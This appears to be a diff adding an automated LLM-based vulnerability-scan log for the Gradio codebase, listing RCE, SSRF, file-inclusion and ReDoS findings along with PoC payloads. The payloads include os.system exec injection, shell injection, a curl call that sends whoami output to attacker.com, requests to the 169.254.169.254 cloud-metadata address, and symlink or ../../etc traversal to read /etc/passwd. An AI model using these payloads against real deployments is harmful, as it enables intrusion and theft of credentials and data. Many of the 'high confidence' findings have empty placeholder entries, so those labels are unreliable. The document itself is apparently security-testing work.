@@ -1,0 +1,592 @@
+agies — auditing /tmp/gradio_src
+
+  Languages: JSON, JavaScript, Python, Shell, TypeScript, YAML
+  Files: 1543
+
+
+Phase A: Path Discovery
+  Backend: tree-sitter
+  Functions: 1373
+    Remote Code Execution: 6 sink(s)
+    Local File Inclusion: 27 sink(s)
+    Server-Side Request Forgery: 20 sink(s)
+    ReDoS (Regular Expression DoS): 14 sink(s)
+    Suspicious — requires analysis (path constructor / logic pattern): 14 
+sink(s)
+
+Phase B: Slice Sorting (81 raw paths)
+  Body-detected orphans: 34 (no call chain)
+  Exploit: 30 + Explore: 15
+    Explore: ssrf-000 from_spaces_interface score=0.55 (non_std_sink, 
+unusual_naming)
+    Explore: ssrf-001 hash_url score=0.47 (non_std_sink, unusual_naming)
+    Explore: redos-002 interpret_gender score=0.52  (non_std_sink)
+  Project type: app
+
+Phase C: README Understanding
+  README: 2000 chars
+  Summary: ```json
+{
+  "project_type": "Open-source Python library for building web-based machine 
+learning and data science demos a...
+
+Phase D: Intent+Logic Agents (45 slices)
+  [1/45] lfi-000 (file)
+  [2/45] rce-001 (load_ipython_extension)
+  [3/45] redos-002 (format_name)
+  [4/45] ssrf-003 (version_check)
+  [5/45] suspicious-004 (upload_demo_to_space)
+  [6/45] rce-005 (git_tracked)
+  [7/45] rce-006 (predict)
+  [8/45] rce-007 (blocks)
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-007...
+    ? 10/10 — interesting
+    Evidence: ssrf-003...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-001...
+    ? 10/10 — interesting
+    Evidence: redos-002...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-005...
+    ✓ not rebutted
+      weak point: The finding is straightforward: `exec(cell, None, local_ns)` 
+executes arbitrary user-controlled code from the `%%blocks` cell magic. No input
+validation or access control is present. The data flow is clear and the 
+vulnerability is directly exploitable.
+    PoC Agent: rce-001...
+    ✓ not rebutted
+      weak point: The function is a public API with no input sanitization, and 
+the sink uses shell=True with f-string interpolation, making command injection 
+straightforward.
+    PoC Agent: rce-005...
+    ✓ not rebutted
+      weak point: The function `blocks` directly calls `exec(cell, None, 
+local_ns)` where `cell` is the IPython cell input, which is fully 
+attacker-controlled. No input validation or sanitization is present. The 
+`[REACHABILITY: BODY_ONLY]` annotation is misleading because the function is a 
+public API in a library (Gradio) intended to be called by users in IPython 
+notebooks, making it reachable with attacker-controlled input. The data flow is 
+clear: `cell` enters the function and reaches `exec` without any transformation.
+This is a classic RCE vulnerability.
+    PoC Agent: rce-007...
+    ? pattern match, LLM skeptical (1 match(es))
+  [9/45] rce-008 (make_waveform)
+    ? pattern match, LLM skeptical (3 match(es))
+  [10/45] ssrf-009 (validate_url)
+    ? 10/10 — interesting
+    Evidence: rce-006...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: suspicious-004...
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: lfi-000...
+    ? pattern match, LLM skeptical (6 match(es))
+  [11/45] ssrf-010 (is_valid_url)
+    ✓ not rebutted
+      weak point: The finding is clearly exploitable: no input validation on 
+demo_name, direct use in pathlib.Path and shutil.copytree, and the function is a
+public API reachable by external callers.
+    PoC Agent: suspicious-004...
+    ✓ not rebutted
+      weak point: The finding relies on the attacker's ability to create a 
+symlink inside an allowed directory. While this is a realistic scenario (e.g., 
+if the app allows file uploads or the developer misconfigures allowed_paths), 
+the exploitability depends on the specific deployment environment. However, the 
+code does not resolve symlinks, making it a valid vulnerability.
+    PoC Agent: lfi-000...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-008...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/rce_python_code_cell_variable_blo
+cks.py
+    Evidence: rce-007...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/rce_function_git_tracked_uses_git
+_tracked.py
+    Evidence: rce-005...
+    ✓ not rebutted
+      weak point: The finding is straightforward: `audio_file` is 
+user-controlled, directly interpolated into an f-string, and executed with 
+`shell=True`. No sanitization is present. The data flow is clear from the source
+code.
+    PoC Agent: rce-008...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/rce_python_code_cell_load_ipython
+_extension.py
+    Evidence: rce-001...
+    ✓ evidence found (8 match(es))
+      PoC: import os; os.system('id')...
+    Verifying rce-007...
+    ✓ evidence found (7 match(es))
+      PoC: If the function is called with demo='; echo pwned #' and file='test',
+the shell executes 'echo pwned' before the git command. Alternatively, using 
+$(i...
+    Verifying rce-005...
+    ✓ verification confirmed
+  [12/45] lfi-011 (build_pip_template)
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: ssrf-010...
+    ✓ evidence found (7 match(es))
+      PoC: %%blocks
+import os; os.system('id')...
+    Verifying rce-001...
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: ssrf-009...
+    ✓ verification confirmed
+  [13/45] lfi-012 (upload_demo_to_space)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/lfi_however_validation_uses_utils
+_file.py
+    Evidence: lfi-000...
+    ✓ not rebutted
+      weak point: The extension check is insufficient to block URLs, and the 
+HTTP client follows redirects by default without host allowlisting, making SSRF 
+exploitable.
+    PoC Agent: ssrf-010...
+    ✓ verification confirmed
+  [14/45] lfi-013 (format_release_notes)
+    ✓ not rebutted
+      weak point: The finding is well-supported by the source code. The 
+`/proxy={url_path:path}` endpoint directly passes user-controlled URL to 
+`httpx.AsyncClient` without host allowlisting or IP restriction. The 
+`validate_url` function only checks URL validity via HEAD request and follows 
+redirects by default, allowing bypass via redirect to internal services. The 
+response is streamed back, enabling reflective SSRF. No guards are in place to 
+prevent exploitation.
+    PoC Agent: ssrf-009...
+    ✓ evidence found (4 match(es))
+      PoC: 1. Create a symlink inside an allowed directory (e.g., 
+/tmp/allowed_dir/symlink) pointing to /etc/passwd.
+2. Request: GET /file=/tmp/allowed_dir/symli...
+    Verifying lfi-000...
+    ? 10/10 — interesting
+    Evidence: lfi-011...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/rce_use_shell_true_subprocess_mak
+e_waveform.py
+    Evidence: rce-008...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: lfi-012...
+    ? 10/10 — interesting
+    Evidence: lfi-013...
+    ✓ verification confirmed
+  [15/45] lfi-014 (download_artifact)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/lfi_supply_demo_name_containing_u
+pload_demo_to_space.py
+    Evidence: suspicious-004...
+  [16/45] lfi-015 (launch_counter)
+    ? pattern match, LLM skeptical (4 match(es))
+  [17/45] redos-016 (from_spaces)
+    ✓ not rebutted
+      weak point: The finding is straightforward: user-controlled demo_name is 
+directly interpolated into a path string without sanitization, and 
+shutil.copytree will copy any directory reachable via path traversal. No input 
+validation or access control is present. The function is a public API, so an 
+attacker can call it directly.
+    PoC Agent: lfi-012...
+    ? pattern match, LLM skeptical (5 match(es))
+  [18/45] lfi-017 (download_binary)
+    ✓ evidence found (7 match(es))
+      PoC: Provide an audio file path like `/tmp/audio; curl 
+http://attacker.com/$(whoami).wav` to execute arbitrary commands....
+    Verifying rce-008...
+    ✓ verification confirmed
+  [19/45] lfi-018 (__call__)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/ssrf_url_forwards_requests_httpx_
+validate_url.py
+    Evidence: ssrf-009...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/ssrf_validates_only_extension_is_
+valid_url.py
+    Evidence: ssrf-010...
+    ? 10/10 — interesting
+    Evidence: lfi-014...
+    ? 10/10 — interesting
+    Evidence: redos-016...
+    ? 10/10 — interesting
+    Evidence: lfi-015...
+    ? pattern match, LLM skeptical (1 match(es))
+  [20/45] lfi-019 (decode_base64_to_image)
+    ? pattern match, LLM skeptical (4 match(es))
+  [21/45] redos-020 (_start_tunnel)
+    ? 10/10 — interesting
+    Evidence: lfi-017...
+    ✓ evidence found (4 match(es))
+      PoC: curl -X POST -d 
+'subtitle=http://169.254.169.254/latest/meta-data/.srt' 
+http://target.com/api/format_subtitle...
+    Verifying ssrf-010...
+    ? pattern match, LLM skeptical (7 match(es))
+  [22/45] ssrf-021 (readme_to_html)
+    ✓ evidence found (7 match(es))
+      PoC: GET /proxy=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+Host: victim.com
+
+Or use a redirect: set up a server that returns 302 Location: http://12...
+    Verifying ssrf-009...
+    ✓ verification confirmed
+  [23/45] ssrf-022 (get_updated_messaging)
+    ? pattern match, LLM skeptical (5 match(es))
+  [24/45] ssrf-023 (setup_tunnel)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/lfi_supply_demo_name_containing_u
+pload_demo_to_space_2.py
+    Evidence: lfi-012...
+    ✓ verification confirmed
+  [25/45] ssrf-024 (from_model)
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: lfi-018...
+    ✓ evidence found (7 match(es))
+      PoC: Call upload_demo_to_space(demo_name='../../etc', 
+space_id='your-space-id', hf_token='your-token') to copy the /etc directory into
+the space....
+    Verifying lfi-012...
+    ? 10/10 — interesting
+    Evidence: ssrf-022...
+    ? 10/10 — interesting
+    Evidence: ssrf-021...
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code uses 
+`utils.abspath` which does not resolve symlinks, and the containment check 
+`utils.is_in_or_equal` can be bypassed via symlinks inside allowed directories. 
+The developer's intent to restrict file serving is undermined by this 
+implementation gap. Additionally, the default empty `allowed_paths` and the 
+reliance on `in_app_dir` check may be bypassed if the app directory is not 
+properly restricted. The data flow shows untrusted input reaches the sink 
+`FileResponse` via the `/file={path_or_url:path}` endpoint, and the guards are 
+insufficient to prevent symlink-based traversal.
+    PoC Agent: lfi-018...
+    ✓ verification confirmed
+  [26/45] ssrf-025 (get_blocks_party_spaces)
+    ? 10/10 — interesting
+    Evidence: lfi-019...
+    ? 10/10 — interesting
+    Evidence: redos-020...
+    ? pattern match, LLM skeptical (5 match(es))
+  [27/45] redos-026 (tex2svg)
+    ? pattern match, LLM skeptical (3 match(es))
+  [28/45] redos-027 (remove_html_tags)
+    ? pattern match, LLM skeptical (4 match(es))
+  [29/45] redos-028 (push_to_hub)
+    ? pattern match, LLM skeptical (1 match(es))
+  [30/45] lfi-029 (flag)
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: ssrf-024...
+    ? 10/10 — interesting
+    Evidence: ssrf-023...
+    ✓ not rebutted
+      weak point: The user-controlled `model_name` is directly embedded into the
+URL without validation, and `requests.request` follows redirects by default, 
+enabling SSRF to internal services or cloud metadata endpoints.
+    PoC Agent: ssrf-024...
+    ? 10/10 — interesting
+    Evidence: ssrf-025...
+    ? pattern match, LLM skeptical (5 match(es))
+  [31/45] ssrf-000 (from_spaces_interface)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/lfi_however_validation_uses_utils
+___call.py
+    Evidence: lfi-018...
+    ? pattern match, LLM skeptical (3 match(es))
+  [32/45] ssrf-001 (hash_url)
+    ? 10/10 — interesting
+    Evidence: redos-027...
+    ? 10/10 — interesting
+    Evidence: redos-026...
+    ? 10/10 — interesting
+    Evidence: redos-028...
+    ? pattern match, LLM skeptical (1 match(es))
+  [33/45] redos-002 (interpret_gender)
+    ✓ evidence found (6 match(es))
+      PoC: 1. Upload a symlink file (e.g., 'evil_symlink') pointing to 
+/etc/passwd to an allowed directory (e.g., via the /upload endpoint).
+2. Request /file=evi...
+    Verifying lfi-018...
+    ? pattern match, LLM skeptical (4 match(es))
+  [34/45] suspicious-003 (build)
+    ? pattern match, LLM skeptical (4 match(es))
+  [35/45] suspicious-004 (add_demos)
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: lfi-029...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/ssrf_urls_using_controlled_model_
+from_model.py
+    Evidence: ssrf-024...
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: ssrf-000...
+    ✓ verification confirmed
+  [36/45] suspicious-005 (build)
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code lacks any 
+validation on the iframe_url obtained from the API, and requests.get follows 
+redirects by default. The user-controlled space_name can lead to a malicious 
+host URL, enabling SSRF to internal services.
+    PoC Agent: ssrf-000...
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the validation uses 
+`utils.abspath` which does not resolve symlinks, and the code does not check for
+symlinks before serving files. An attacker who can create a symlink inside an 
+allowed directory can bypass the containment check and read arbitrary files. The
+data flow shows untrusted input reaches the sink, and the guards are 
+insufficient.
+    PoC Agent: lfi-029...
+    ? 10/10 — interesting
+    Evidence: redos-002...
+    ✓ evidence found (4 match(es))
+      PoC: import requests
+# Assume the function is called with attacker-controlled model_name
+model_name = "../169.254.169.254/latest/meta-data/"
+# The resultin...
+    Verifying ssrf-024...
+    ? pattern match, LLM skeptical (1 match(es))
+  [37/45] suspicious-006 (get_code_and_description)
+    ? 10/10 — interesting
+    Evidence: suspicious-003...
+  [38/45] suspicious-007 (build)
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: ssrf-001...
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code clearly shows
+user-controlled URLs reaching `requests.get` and `urllib.request.urlopen` 
+without any host/IP validation or redirect disabling. The developer's assumption
+that URL format validation is sufficient is contradicted by the actual code 
+behavior.
+    PoC Agent: ssrf-001...
+    ✓ verification confirmed
+  [39/45] suspicious-008 (build)
+    ? 10/10 — interesting
+    Evidence: suspicious-005...
+  [40/45] suspicious-009 (copy_all_demos)
+    ? 10/10 — interesting
+    Evidence: suspicious-007...
+  [41/45] suspicious-010 (random_model3d)
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: suspicious-004...
+    ✓ not rebutted
+      weak point: The finding is straightforward: user-controlled input from 
+cls['tags']['demos'] is used directly in os.path.join without sanitization, 
+leading to path traversal. No validation or access control is present. The code 
+is reachable via external API as indicated by the REACHABILITY annotation.
+    PoC Agent: suspicious-004...
+    ? 10/10 — interesting
+    Evidence: suspicious-008...
+  [42/45] lfi-011 (flag)
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: suspicious-006...
+    ? 10/10 — interesting
+    Evidence: suspicious-009...
+  [43/45] lfi-012 (__init__)
+    ✓ not rebutted
+      weak point: The finding is straightforward: user-controlled `demo_name` is
+used in `os.path.join` without sanitization, enabling path traversal. No input 
+validation or access control is present. The function is a public API, so 
+external callers can supply arbitrary `demo_name` values. Exploitation is 
+practical for reading arbitrary files.
+    PoC Agent: suspicious-006...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/lfi_however_validation_uses_utils
+_flag.py
+    Evidence: lfi-029...
+    ? 10/10 — interesting
+    Evidence: suspicious-010...
+  [44/45] lfi-013 (load_from_cache)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/ssrf_hugging_face_api_get_from_sp
+aces_interface.py
+    Evidence: ssrf-000...
+    ? 10/10 — interesting
+    Evidence: lfi-012...
+    ? pattern match, LLM skeptical (3 match(es))
+  [45/45] lfi-014 (init_tqdm)
+    ✓ evidence found (6 match(es))
+      PoC: 1. Identify an allowed directory (e.g., the app's working directory 
+or any directory in `allowed_paths`).
+2. Create a symlink inside that directory po...
+    Verifying lfi-029...
+    ✓ evidence found (5 match(es))
+      PoC: 1. Create a Hugging Face Space that returns a JSON response with 
+`{"host": "http://169.254.169.254/latest/meta-data/"}`.
+2. Call `gr.load('attacker-sp...
+    Verifying ssrf-000...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/ssrf_url_download_temp_copy_hash_
+url.py
+    Evidence: ssrf-001...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/lfi_demos_dir_read_contents_add_d
+emos.py
+    Evidence: suspicious-004...
+    ✓ verification confirmed
+    ✓ 2/10 — safe
+    Evidence: lfi-013...
+    ✓ verification confirmed
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/lfi_supply_demo_name_containing_g
+et_code_and_description.py
+    Evidence: suspicious-006...
+    ✓ 1/10 — safe
+    Evidence: lfi-014...
+    ? pattern match, LLM skeptical (4 match(es))
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: lfi-011...
+    ✓ evidence found (4 match(es))
+      PoC: 1. Set up a public HTTP server that returns a 302 redirect to 
+http://169.254.169.254/latest/meta-data/.
+2. Submit a video input with the URL of the at...
+    Verifying ssrf-001...
+    ? pattern match, LLM skeptical (4 match(es))
+    ✓ verification confirmed
+    ✓ not rebutted
+      weak point: The finding correctly identifies that `utils.abspath` does not
+resolve symlinks, allowing symlink-based bypass of path validation. The data 
+flow shows user-controlled input reaches the `file` endpoint, and the guards 
+(allowed_paths, blocked_paths) are user-controlled or empty by default. The 
+symlink attack is practical if an attacker can create a symlink (e.g., via file 
+upload). The finding is well-supported and not easily disproven.
+    PoC Agent: lfi-011...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/gradio_src/lfi_however_validation_uses_utils
+_flag_2.py
+    Evidence: lfi-011...
+    ✓ evidence found (6 match(es))
+      PoC: 1. Upload a symlink file via the /upload endpoint (if file upload is 
+enabled). The symlink should point to /etc/passwd. 2. Request 
+/file=uploaded_syml...
+    Verifying lfi-011...
+    ✓ verification confirmed
+
+Phase E: Results
+  Blackboard: 28 cached intents, 169 knowledge entries, 39 phase results
+  High confidence (43):
+    lfi-000: FileResponse — logic_gap
+      Create a symlink inside an allowed directory pointing to /etc/passwd, then
+request /file=allowed_dir/symlink_to_passwd
+    ssrf-000: requests.get — logic_gap
+      http://169.254.169.254/latest/meta-data/
+    rce-001: exec — logic_gap
+      %%blocks
+import os; os.system('id')
+    ssrf-001: requests.get — logic_gap
+      http://attacker.com/redirect?to=http://169.254.169.254/latest/meta-data/
+    redos-002: ? — ?
+      
+    redos-002: ? — ?
+      
+    ssrf-003: ? — ?
+      
+    suspicious-004: upload_demo_to_space — logic_gap
+      Set `demo_name` to `../../etc` to copy the `/etc` directory to the Space, 
+exposing system configuration files.
+    suspicious-004: add_demos — logic_gap
+      If an attacker can set the `demos` tag to `../../etc/passwd`, the 
+resulting path becomes `DEMOS_DIR/../../etc/passwd/run.py`, which resolves to 
+`/etc/passwd/run.py`. The open will fail because `run.py` doesn't exist, but the
+attacker can read any file by using a path like `../../etc/passwd` and then the 
+code will try to open `run.py` inside that directory. To read a specific file, 
+the attacker could use `../../etc/passwd` and then the code will attempt to open
+`run.py` inside `/etc/passwd/`, which fails. However, the attacker can read 
+files by using a path that ends with a directory containing a `run.py` file, or 
+by exploiting the fact that the error message may leak file existence. More 
+directly, if the attacker can control the `demos` tag to be `../sensitive_file` 
+(without the trailing `/run.py`), the path becomes 
+`DEMOS_DIR/../sensitive_file/run.py`, which will fail. But if the attacker uses 
+`../sensitive_dir` where `sensitive_dir` contains a `run.py`, they can read that
+file. The primary risk is arbitrary file read if the attacker can create a 
+symlink or if there is a directory with a `run.py` file outside the intended 
+scope.
+    rce-005: subprocess.Popen — logic_gap
+      If demo is controlled, payload: ; echo 'pwned' # or $(malicious_command). 
+If file is controlled, payload: ; id #
+    rce-006: ? — ?
+      
+    suspicious-006: get_code_and_description — logic_gap
+      Call `get_code_and_description(demo_name='../../etc/passwd')` to read 
+`/etc/passwd` (assuming `GRADIO_DEMO_DIR` is a subdirectory like 
+`/tmp/gradio_src/website/homepage/src/demos/`). The resulting paths would be 
+`/tmp/gradio_src/website/homepage/src/demos/../../etc/passwd/run.py` and 
+`/tmp/gradio_src/website/homepage/src/demos/../../etc/passwd/DESCRIPTION.md`, 
+which resolve to `/etc/passwd/run.py` and `/etc/passwd/DESCRIPTION.md`. Since 
+`/etc/passwd` is a file, not a directory, the open will fail. A more practical 
+exploit would target a directory with `run.py` and `DESCRIPTION.md` files, e.g.,
+`demo_name='../../some_project'` to read files from an adjacent project.
+    rce-007: exec — logic_gap
+      import os; os.system('id')
+    rce-008: subprocess.call — logic_gap
+      Provide an audio file path like `/tmp/audio; curl 
+http://attacker.com/$(whoami).wav` to execute commands.
+    ssrf-009: requests.get — logic_gap
+      
+    ssrf-010: requests.head — logic_gap
+      http://169.254.169.254/latest/meta-data/
+    lfi-011: ? — ?
+      
+    lfi-011: FileResponse — logic_gap
+      If an attacker can upload a symlink (e.g., via file upload) pointing to 
+/etc/passwd, then request /file=uploaded_symlink, the validation passes because 
+the symlink path is within allowed directory, but FileResponse follows the 
+symlink and serves /etc/passwd.
+    lfi-012: shutil.copytree — logic_gap
+      demo_name=../../etc/passwd
+    lfi-012: ? — ?
+      
+    lfi-013: ? — ?
+      
+    lfi-014: ? — ?
+      
+    lfi-015: ? — ?
+      
+    redos-016: ? — ?
+      
+    lfi-017: ? — ?
+      
+    lfi-018: FileResponse — logic_gap
+      If the app has an upload feature that saves files to an allowed directory,
+upload a symlink pointing to /etc/passwd, then request /file=<symlink_filename>.
+    lfi-019: ? — ?
+      
+    redos-020: ? — ?
+      
+    ssrf-021: ? — ?
+      
+    ssrf-022: ? — ?
+      
+    ssrf-023: ? — ?
+      
+    ssrf-024: requests.request — logic_gap
+      http://169.254.169.254/latest/meta-data/
+    ssrf-025: ? — ?
+      
+    redos-026: ? — ?
+      
+    redos-027: ? — ?
+      
+    redos-028: ? — ?
+      
+    lfi-029: FileResponse — logic_gap
+      Create a symlink inside an allowed directory pointing to /etc/passwd, then
+request /file=allowed_dir/symlink_to_passwd
+
+Pipeline Complete
+  Target: /tmp/gradio_src
+  Model: deepseek-chat
+  Duration: 131.3s
+  Paths discovered: 81
+  Slices analyzed: 45
+  Findings: 43 high, 2 interesting
+  Tokens: 728,575 total (654,642 prompt + 73,933 completion)
+
+  Recommended verification targets:
+    LFI lfi-000: The `/file={path_or_url:path}` endpoint (line 318) takes 
+user-controlled `path_or_url`. It calls `ut
+    SSRF ssrf-000: The function `from_spaces` takes a user-controlled 
+`space_name` parameter. It constructs a URL to th
+    RCE rce-001: The `blocks` function is registered as an IPython cell magic 
+via `@register_cell_magic`. The `cell` 
+    SSRF ssrf-001: The `_format_video` method (line 2206) accepts a `video` 
+parameter that can be a URL. If `utils.vali
+    REDOS redos-002: Code-level pattern evidence (1 matches): ?:if 
+re.match("^[0-9]+_", guide_name):
+
+v3 CodeQL pipeline complete.
